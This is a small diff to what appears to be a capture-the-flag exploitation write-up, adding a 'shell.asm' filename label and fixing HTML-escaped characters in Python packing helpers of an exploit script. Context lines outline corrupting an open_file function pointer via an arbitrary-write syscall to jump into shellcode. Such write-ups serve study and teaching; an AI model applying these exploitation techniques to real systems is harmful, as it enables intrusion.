@@ -83,6 +83,7 @@ The attack plan is as follows:
   3. Invoke a syscall #93, which opens a file. 
       * At this point, we will tell it to open our file which has corrupted **open_file** function pointer &#8212; thus, calling into our shellcode.
 
+<p class="filename">shell.asm</p>
 {% highlight asm linenos %}
   [BITS 64]
   section .text
@@ -154,10 +155,10 @@ Note that since we are using syscal #92 (encrypt) to perform an arbitrary write 
 import struct
 
 def p(v):
-    return struct.pack('&lt;Q', v)
+    return struct.pack('<Q', v)
 
 def u(v):
-    return struct.unpack('&lt;Q', v)[0]
+    return struct.unpack('<Q', v)[0]
 
 f = open('payload', 'wb')
 
